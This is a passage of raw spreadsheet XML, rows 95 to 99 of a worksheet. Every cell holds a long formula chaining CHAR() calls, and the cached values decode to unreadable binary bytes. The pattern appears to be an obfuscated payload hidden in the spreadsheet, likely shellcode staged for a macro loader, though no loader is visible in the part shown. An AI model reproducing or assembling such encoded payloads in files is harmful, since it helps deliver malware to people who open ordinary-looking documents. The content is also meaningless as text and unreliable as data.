        <f>CHAR(104)&amp;CHAR(196)&amp;CHAR(234)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(21)&amp;CHAR(194)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(81)&amp;CHAR(127)&amp;CHAR(90)&amp;CHAR(132)&amp;CHAR(130)&amp;CHAR(32)&amp;CHAR(135)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(244)&amp;CHAR(112)&amp;CHAR(35)&amp;CHAR(59)&amp;CHAR(244)&amp;CHAR(89)&amp;CHAR(105)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(43)&amp;CHAR(139)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(69)&amp;CHAR(142)&amp;CHAR(142)&amp;CHAR(45)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(62)&amp;CHAR(143)&amp;CHAR(13)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(124)&amp;CHAR(196)&amp;CHAR(233)&amp;CHAR(40)&amp;CHAR(107)&amp;CHAR(3)&amp;CHAR(90)&amp;CHAR(96)&amp;CHAR(10)&amp;CHAR(244)&amp;CHAR(88)&amp;CHAR(94)&amp;CHAR(133)&amp;CHAR(161)&amp;CHAR(35)&amp;CHAR(139)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(131)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(51)&amp;CHAR(155)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(17)&amp;CHAR(82)&amp;CHAR(240)&amp;CHAR(89)&amp;CHAR(121)&amp;CHAR(86)&amp;CHAR(137)&amp;CHAR(135)&amp;CHAR(35)&amp;CHAR(131)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(84)&amp;CHAR(248)&amp;CHAR(115)&amp;CHAR(47)&amp;CHAR(54)&amp;CHAR(246)&amp;CHAR(94)&amp;CHAR(102)&amp;CHAR(140)&amp;CHAR(175)&amp;CHAR(46)&amp;CHAR(137)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(132)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(86)&amp;CHAR(136)&amp;CHAR(141)&amp;CHAR(45)&amp;CHAR(129)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(95)&amp;CHAR(87)&amp;CHAR(251)&amp;CHAR(82)&amp;CHAR(98)&amp;CHAR(136)&amp;CHAR(110)&amp;CHAR(38)&amp;CHAR(79)&amp;CHAR(11)&amp;CHAR(143)&amp;CHAR(82)&amp;CHAR(33)&amp;CHAR(91)&amp;CHAR(89)&amp;CHAR(54)&amp;CHAR(202)&amp;CHAR(128)&amp;CHAR(118)&amp;CHAR(46)&amp;CHAR(66)&amp;CHAR(69)&amp;CHAR(97)&amp;CHAR(159)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(65)&amp;CHAR(137)&amp;CHAR(8)&amp;CHAR(95)&amp;CHAR(138)&amp;CHAR(234)&amp;CHAR(20)&amp;CHAR(136)&amp;CHAR(251)&amp;CHAR(140)&amp;CHAR(6)&amp;CHAR(85)&amp;CHAR(174)&amp;CHAR(161)&amp;CHAR(162)&amp;CHAR(162)&amp;CHAR(244)&amp;CHAR(155)&amp;CHAR(157)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(142)&amp;CHAR(231)&amp;CHAR(6)&amp;CHAR(131)&amp;CHAR(55)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(253)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(50)&amp;CHAR(250)&amp;CHAR(90)&amp;CHAR(109)&amp;CHAR(80)&amp;CHAR(250)&amp;CHAR(94)&amp;CHAR(106)&amp;CHAR(230)&amp;CHAR(32)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(42)&amp;CHAR(37)&amp;CHAR(235)&amp;CHAR(16)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(129)&amp;CHAR(15)&amp;CHAR(1)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(81)&amp;CHAR(117)&amp;CHAR(140)&amp;CHAR(254)&amp;CHAR(141)&amp;CHAR(109)&amp;CHAR(37)&amp;CHAR(26)&amp;CHAR(138)&amp;CHAR(231)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(131)&amp;CHAR(131)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(91)&amp;CHAR(245)&amp;CHAR(90)&amp;CHAR(125)&amp;CHAR(143)&amp;CHAR(75)&amp;CHAR(47)&amp;CHAR(22)&amp;CHAR(140)&amp;CHAR(199)&amp;CHAR(10)&amp;CHAR(131)&amp;CHAR(227)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(138)&amp;CHAR(33)&amp;CHAR(141)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(95)&amp;CHAR(27)</f>
        <v>hÄê_x0004__x0007__x0002_
_x0005__x0007__x0015_ÂQþQZ„‚ ‡_x0007__x0007__x000E_Uôp#;ôYi†‚+‹
	_x0007_EŽŽ-‚_x0002__x0002__x0006_&gt;_x000D__x000D__x0005__x000D_|Äé(k_x0003_Z`
ôX^…¡#‹_x0005_
_x000D__x0002_ƒF!3›@%_x0011_RðYyV‰‡#ƒ_x000E__x0005__x000B_Tøs/6ö^fŒ¯.‰_x0007__x0005__x0007_
„F&amp;.Vˆ-_x0005__x000D__x000E__WûRbˆn&amp;O_x000B_R![Y6Ê€v.BEaŸ@%A‰_x0008__Šê_x0014_ˆûŒ_x0006_U®¡¢¢ô›_x000D__x0006__x000F_Žç_x0006_ƒ7_x0006_
	ýv&amp;2úZmPú^jæ _x0005__x0001__x0002_*%ë_x0010_
_x0002__x0006_ˆ_x000F__x0001_
_x000D_RõQuŒþm%_x001A_Šç_x0006_‚_x0002__x0002__x0007__x0007_ƒƒ_x000F__x0002__x0007__x0007_[õZ}K/_x0016_ŒÇ
ƒã	_x0002__x0002_‰Š!	_x0005__x0005_†__x001B_</v>
      </c>
      <c r="C95" t="str">
        <f>CHAR(240)&amp;CHAR(127)&amp;CHAR(125)&amp;CHAR(95)&amp;CHAR(160)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(240)&amp;CHAR(117)</f>
        <v>ð}_ ê‘[ðu</v>
      </c>
    </row>
    <row r="96" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B96" t="str">
        <f>CHAR(143)&amp;CHAR(69)&amp;CHAR(25)&amp;CHAR(82)&amp;CHAR(94)&amp;CHAR(88)&amp;CHAR(137)&amp;CHAR(1)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(248)&amp;CHAR(90)&amp;CHAR(65)&amp;CHAR(129)&amp;CHAR(245)&amp;CHAR(135)&amp;CHAR(245)&amp;CHAR(13)&amp;CHAR(141)&amp;CHAR(185)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(55)&amp;CHAR(238)&amp;CHAR(130)&amp;CHAR(199)&amp;CHAR(122)&amp;CHAR(107)&amp;CHAR(91)&amp;CHAR(81)&amp;CHAR(109)&amp;CHAR(11)&amp;CHAR(244)&amp;CHAR(89)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(238)&amp;CHAR(138)&amp;CHAR(230)&amp;CHAR(126)&amp;CHAR(104)&amp;CHAR(132)&amp;CHAR(161)&amp;CHAR(35)&amp;CHAR(138)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(187)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(95)&amp;CHAR(49)&amp;CHAR(196)&amp;CHAR(192)&amp;CHAR(226)&amp;CHAR(2)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(195)&amp;CHAR(87)&amp;CHAR(244)&amp;CHAR(86)&amp;CHAR(122)&amp;CHAR(103)&amp;CHAR(10)&amp;CHAR(131)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(95)&amp;CHAR(78)&amp;CHAR(98)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(67)&amp;CHAR(135)&amp;CHAR(77)&amp;CHAR(34)&amp;CHAR(72)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(131)&amp;CHAR(42)&amp;CHAR(129)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(87)&amp;CHAR(94)&amp;CHAR(245)&amp;CHAR(90)&amp;CHAR(109)&amp;CHAR(141)&amp;CHAR(247)&amp;CHAR(142)&amp;CHAR(245)&amp;CHAR(112)&amp;CHAR(1)&amp;CHAR(80)&amp;CHAR(248)&amp;CHAR(89)&amp;CHAR(109)&amp;CHAR(49)&amp;CHAR(239)&amp;CHAR(137)&amp;CHAR(130)&amp;CHAR(33)&amp;CHAR(137)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(77)&amp;CHAR(135)&amp;CHAR(139)&amp;CHAR(38)&amp;CHAR(132)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(49)&amp;CHAR(132)&amp;CHAR(15)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(119)&amp;CHAR(181)&amp;CHAR(142)&amp;CHAR(250)&amp;CHAR(114)&amp;CHAR(49)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(45)&amp;CHAR(138)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(109)&amp;CHAR(83)&amp;CHAR(87)&amp;CHAR(140)&amp;CHAR(230)&amp;CHAR(25)&amp;CHAR(139)&amp;CHAR(112)&amp;CHAR(39)&amp;CHAR(83)&amp;CHAR(140)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(247)&amp;CHAR(110)&amp;CHAR(7)&amp;CHAR(140)&amp;CHAR(3)&amp;CHAR(175)&amp;CHAR(97)&amp;CHAR(21)&amp;CHAR(7)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(175)&amp;CHAR(172)&amp;CHAR(162)&amp;CHAR(142)&amp;CHAR(115)&amp;CHAR(46)&amp;CHAR(53)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(253)&amp;CHAR(151)&amp;CHAR(225)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(224)&amp;CHAR(122)&amp;CHAR(11)&amp;CHAR(87)&amp;CHAR(251)&amp;CHAR(82)&amp;CHAR(102)&amp;CHAR(128)&amp;CHAR(102)&amp;CHAR(38)&amp;CHAR(19)&amp;CHAR(224)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(105)&amp;CHAR(35)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(126)&amp;CHAR(41)&amp;CHAR(30)&amp;CHAR(92)&amp;CHAR(253)&amp;CHAR(86)&amp;CHAR(115)&amp;CHAR(67)&amp;CHAR(251)&amp;CHAR(82)&amp;CHAR(117)&amp;CHAR(49)&amp;CHAR(207)&amp;CHAR(74)&amp;CHAR(86)&amp;CHAR(88)&amp;CHAR(89)&amp;CHAR(88)&amp;CHAR(132)&amp;CHAR(195)&amp;CHAR(98)&amp;CHAR(198)&amp;CHAR(138)&amp;CHAR(232)&amp;CHAR(219)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(177)&amp;CHAR(12)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(67)&amp;CHAR(205)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(37)&amp;CHAR(54)&amp;CHAR(202)</f>
        <v>E_x0019_R^X‰_x0001_‚F"1øZAõ‡õ_x000D_¹_x0016__x0004__x0001_Š„_x000B__x0002_	_x0006_7î‚Çzk[Qm_x000B_ôYU†îŠæ~h„¡#Š	_x0002__x0002__x0002_…»_x000D__x0001__x0005__x0005__x000D_x_1ÄÀâ_x0002__x000F_
_x0003__x000B__x0002__x0005_ÃWôVzg
ƒF!_NbˆE&amp;C‡M"HSŠƒ*_x000B__x0004__x0007_W^õZm÷Žõp_x0001_PøYm1ï‰‚!‰	_x0005__x0005_M‡‹&amp;„_x0001__x0002__x000B_1„_x000F__x0003__x0002__x0006_wµŽúr1‰N&amp;-ŠB mSWŒæ_x0019_‹p'SŒ_x000E_Ž÷n_x0007_Œ_x0003_¯a_x0015__x0007__x000F__x000B_¯¬¢Žs.5TRý—á		_x0005_€àz_x000B_WûRf€f&amp;_x0013_à
i#_x0013_Ž~)_x001E_\ýVsCûRu1ÏJVXYX„ÃbÆŠèÛ_x0007__x000B_
±_x000C__x0006__x000F_CÍM#%6Ê</v>
      </c>
      <c r="C96" t="str">
        <f>CHAR(176)&amp;CHAR(242)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(19)&amp;CHAR(51)&amp;CHAR(253)&amp;CHAR(20)&amp;CHAR(50)</f>
        <v>°òˆê‘_x0013_3ý_x0014_2</v>
      </c>
    </row>
    <row r="97" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B97" t="str">
        <f>CHAR(65)&amp;CHAR(123)&amp;CHAR(81)&amp;CHAR(87)&amp;CHAR(141)&amp;CHAR(169)&amp;CHAR(45)&amp;CHAR(225)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(135)&amp;CHAR(75)&amp;CHAR(38)&amp;CHAR(72)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(94)&amp;CHAR(139)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(94)&amp;CHAR(133)&amp;CHAR(184)&amp;CHAR(11)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(12)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(97)&amp;CHAR(142)&amp;CHAR(82)&amp;CHAR(32)&amp;CHAR(109)&amp;CHAR(136)&amp;CHAR(134)&amp;CHAR(43)&amp;CHAR(162)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(131)&amp;CHAR(35)&amp;CHAR(206)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(131)&amp;CHAR(47)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(143)&amp;CHAR(46)&amp;CHAR(217)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(131)&amp;CHAR(141)&amp;CHAR(38)&amp;CHAR(218)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(140)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(14)&amp;CHAR(88)&amp;CHAR(197)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(50)&amp;CHAR(16)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(204)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(49)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(73)&amp;CHAR(46)&amp;CHAR(202)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(58)&amp;CHAR(13)&amp;CHAR(140)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(198)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(51)&amp;CHAR(6)&amp;CHAR(91)&amp;CHAR(135)&amp;CHAR(198)&amp;CHAR(196)&amp;CHAR(67)&amp;CHAR(35)&amp;CHAR(78)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(192)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(77)&amp;CHAR(142)&amp;CHAR(239)&amp;CHAR(14)&amp;CHAR(126)&amp;CHAR(205)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(77)&amp;CHAR(243)&amp;CHAR(245)&amp;CHAR(217)&amp;CHAR(193)&amp;CHAR(197)&amp;CHAR(70)&amp;CHAR(34)&amp;CHAR(73)&amp;CHAR(65)&amp;CHAR(136)&amp;CHAR(233)&amp;CHAR(77)&amp;CHAR(202)&amp;CHAR(74)&amp;CHAR(43)&amp;CHAR(86)&amp;CHAR(141)&amp;CHAR(173)&amp;CHAR(38)&amp;CHAR(59)&amp;CHAR(205)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(87)&amp;CHAR(139)&amp;CHAR(154)&amp;CHAR(33)&amp;CHAR(63)&amp;CHAR(204)&amp;CHAR(65)&amp;CHAR(46)&amp;CHAR(105)&amp;CHAR(139)&amp;CHAR(182)&amp;CHAR(38)&amp;CHAR(37)&amp;CHAR(192)&amp;CHAR(82)&amp;CHAR(32)&amp;CHAR(109)&amp;CHAR(136)&amp;CHAR(182)&amp;CHAR(43)&amp;CHAR(34)&amp;CHAR(206)&amp;CHAR(66)&amp;CHAR(32)&amp;CHAR(119)&amp;CHAR(142)&amp;CHAR(225)&amp;CHAR(70)&amp;CHAR(140)&amp;CHAR(204)&amp;CHAR(64)&amp;CHAR(35)&amp;CHAR(127)&amp;CHAR(196)&amp;CHAR(178)&amp;CHAR(9)&amp;CHAR(15)&amp;CHAR(193)&amp;CHAR(75)&amp;CHAR(47)&amp;CHAR(118)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(73)&amp;CHAR(142)&amp;CHAR(205)&amp;CHAR(141)&amp;CHAR(38)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(200)&amp;CHAR(65)&amp;CHAR(136)&amp;CHAR(17)&amp;CHAR(202)&amp;CHAR(138)&amp;CHAR(43)&amp;CHAR(134)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(70)&amp;CHAR(143)&amp;CHAR(15)&amp;CHAR(204)&amp;CHAR(134)&amp;CHAR(34)&amp;CHAR(141)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(8)&amp;CHAR(64)&amp;CHAR(143)&amp;CHAR(6)&amp;CHAR(197)&amp;CHAR(129)&amp;CHAR(35)&amp;CHAR(154)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(70)&amp;CHAR(135)&amp;CHAR(21)&amp;CHAR(193)&amp;CHAR(128)&amp;CHAR(39)&amp;CHAR(151)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(76)&amp;CHAR(142)&amp;CHAR(155)</f>
        <v>A{QW©-á_x0005__x0005__x000D_‡K&amp;HˆF/^‹O/^…¸_x000B__x000E__x0005_
_x000C_‹N&amp;aŽR mˆ†+¢	_x0006__x0004_Šƒ#Î_x0005__x000B__x0004_Žƒ/Â	_x000D__x0006_†.Ù_x0007__x0005__x0007_ƒ&amp;Ú_x0002__x0006__x0005_„ŒM_x0002__x000D__x000E_XÅ@%2_x0010_F/ÌF"1_x0003_€I.ÊF.:_x000D_ŒB ÆE&amp;3_x0006_[‡ÆÄC#N_x0005_	_x0004__x0007_ÀO.MŽï_x000E_~ÍM#MóõÙÁÅF"IAˆéMÊJ+V­&amp;;ÍF/W‹š!?ÌA.i‹¶&amp;%ÀR mˆ¶+"ÎB wŽáFŒÌ@#Ä²	_x000F_ÁK/v	_x0007_IŽÍ&amp;‚_x0002__x0006__x0005_ÈAˆ_x0011_ÊŠ+†_x0004__x0001__x0002_
F_x000F_Ì†"_x0007__x000B__x0005__x0008_@_x0006_Å#š_x0004__x0001__x0001__x0002_F‡_x0015_Á€'—_x0007__x000E__x0005_
LŽ›</v>
      </c>
      <c r="C97" t="str">
        <f>CHAR(3)&amp;CHAR(214)&amp;CHAR(180)&amp;CHAR(115)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(113)&amp;CHAR(133)&amp;CHAR(223)&amp;CHAR(170)</f>
        <v>_x0003_Ö´s¸ôq…ßª</v>
      </c>
    </row>
    <row r="98" spans="2:3" ht="399" x14ac:dyDescent="0.45">
      <c r="B98" t="str">
        <f>CHAR(204)&amp;CHAR(142)&amp;CHAR(45)&amp;CHAR(153)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(46)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(192)&amp;CHAR(142)&amp;CHAR(45)&amp;CHAR(154)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(65)&amp;CHAR(8)&amp;CHAR(198)&amp;CHAR(194)&amp;CHAR(137)&amp;CHAR(42)&amp;CHAR(147)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(74)&amp;CHAR(130)&amp;CHAR(150)&amp;CHAR(38)&amp;CHAR(204)&amp;CHAR(143)&amp;CHAR(38)&amp;CHAR(166)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(205)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(163)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(73)&amp;CHAR(3)&amp;CHAR(204)&amp;CHAR(66)&amp;CHAR(206)&amp;CHAR(130)&amp;CHAR(32)&amp;CHAR(171)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(140)&amp;CHAR(151)&amp;CHAR(32)&amp;CHAR(23)&amp;CHAR(192)&amp;CHAR(143)&amp;CHAR(46)&amp;CHAR(185)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(201)&amp;CHAR(65)&amp;CHAR(142)&amp;CHAR(194)&amp;CHAR(131)&amp;CHAR(46)&amp;CHAR(189)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(154)&amp;CHAR(33)&amp;CHAR(17)&amp;CHAR(8)&amp;CHAR(194)&amp;CHAR(129)&amp;CHAR(41)&amp;CHAR(182)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(244)&amp;CHAR(221)&amp;CHAR(197)&amp;CHAR(143)&amp;CHAR(47)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(67)&amp;CHAR(140)&amp;CHAR(254)&amp;CHAR(69)&amp;CHAR(197)&amp;CHAR(142)&amp;CHAR(38)&amp;CHAR(197)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(181)&amp;CHAR(38)&amp;CHAR(39)&amp;CHAR(205)&amp;CHAR(141)&amp;CHAR(34)&amp;CHAR(204)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(133)&amp;CHAR(185)&amp;CHAR(47)&amp;CHAR(36)&amp;CHAR(192)&amp;CHAR(131)&amp;CHAR(47)&amp;CHAR(218)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(151)&amp;CHAR(46)&amp;CHAR(49)&amp;CHAR(192)&amp;CHAR(129)&amp;CHAR(35)&amp;CHAR(210)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(170)&amp;CHAR(33)&amp;CHAR(57)&amp;CHAR(206)&amp;CHAR(129)&amp;CHAR(33)&amp;CHAR(237)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(133)&amp;CHAR(197)&amp;CHAR(74)&amp;CHAR(10)&amp;CHAR(205)&amp;CHAR(134)&amp;CHAR(47)&amp;CHAR(239)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(198)&amp;CHAR(10)&amp;CHAR(132)&amp;CHAR(70)&amp;CHAR(46)&amp;CHAR(22)&amp;CHAR(113)&amp;CHAR(1)&amp;CHAR(157)&amp;CHAR(4)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(27)&amp;CHAR(129)&amp;CHAR(177)&amp;CHAR(82)&amp;CHAR(29)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(22)&amp;CHAR(28)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(4)&amp;CHAR(255)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(29)&amp;CHAR(53)&amp;CHAR(212)&amp;CHAR(130)&amp;CHAR(118)&amp;CHAR(45)&amp;CHAR(31)&amp;CHAR(86)&amp;CHAR(248)&amp;CHAR(95)&amp;CHAR(49)&amp;CHAR(100)&amp;CHAR(137)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(77)&amp;CHAR(45)&amp;CHAR(45)&amp;CHAR(142)&amp;CHAR(93)&amp;CHAR(50)&amp;CHAR(105)&amp;CHAR(57)&amp;CHAR(72)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(11)&amp;CHAR(2)&amp;CHAR(80)&amp;CHAR(111)&amp;CHAR(71)&amp;CHAR(179)&amp;CHAR(5)&amp;CHAR(58)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(179)&amp;CHAR(2)&amp;CHAR(21)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(39)</f>
        <v>ÌŽ-™_x0006__x000F__x000B_.	_x0006__x0005_ÀŽ-š_x0002__x0002__x0006__x0005_A_x0008_ÆÂ‰*“_x0002__x0004__x0001_J‚–&amp;Ì&amp;¦_x0005__x0007__x000B__x000D__x000B__x000D__x0002_Í†!£_x0016__x0004__x0001_I_x0003_ÌBÎ‚ «_x0007__x0007__x000E_Œ— _x0017_À.¹_x000D__x0006__x000F_
ÉAŽÂƒ.½_x0002__x0002__x0002_š!_x0011__x0008_Â)¶_x000F__x0002__x0004__x0001__x0002_ôÝÅ/¾_x0006__x0005__x0007_CŒþEÅŽ&amp;Å_x0007__x0016__x0004_Šµ&amp;'Í"Ì_x0003__x0007__x0007_…¹/$Àƒ/Ú	_x000D__x0006_„—.1À#Ò	_x0002__x0002_‰ª!9Î!í_x000E__x000F__x0002_…ÅJ
Í†/ï_x0002__x0006__x0005__x0007__x000B_Æ
„F._x0016_q_x0001__x0004_ˆE&amp;_x001B_±R_x001D__x0003__x0007__x0002__x0016__x001C__x000B__x0004__x0004_ÿ‚N-_x001D_5Ô‚v-_x001F_Vø_1d‰M_x0002_ŒM--Ž]2i9H_x0003__x0006__x0004_‚	_x000B__x0002_PoG³_x0005_:_x000D__x0002_³_x0002__x0015__x0007__x0016_TˆE&amp;'</v>
      </c>
      <c r="C98" t="str">
        <f>CHAR(20)&amp;CHAR(155)&amp;CHAR(183)&amp;CHAR(113)&amp;CHAR(30)&amp;CHAR(123)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(244)&amp;CHAR(19)</f>
        <v>_x0014_›·q_x001E_{ˆêô_x0013_</v>
      </c>
    </row>
    <row r="99" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B99" t="str">
        <f>CHAR(129)&amp;CHAR(78)&amp;CHAR(86)&amp;CHAR(7)&amp;CHAR(194)&amp;CHAR(87)&amp;CHAR(84)&amp;CHAR(241)&amp;CHAR(80)&amp;CHAR(55)&amp;CHAR(143)&amp;CHAR(247)&amp;CHAR(130)&amp;CHAR(253)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(84)&amp;CHAR(4)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(5)&amp;CHAR(190)&amp;CHAR(88)&amp;CHAR(17)&amp;CHAR(52)&amp;CHAR(202)&amp;CHAR(138)&amp;CHAR(102)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(6)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(37)&amp;CHAR(99)&amp;CHAR(62)&amp;CHAR(74)&amp;CHAR(8)&amp;CHAR(124)&amp;CHAR(53)&amp;CHAR(143)&amp;CHAR(109)&amp;CHAR(38)&amp;CHAR(31)&amp;CHAR(9)&amp;CHAR(221)&amp;CHAR(244)&amp;CHAR(120)&amp;CHAR(254)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(206)&amp;CH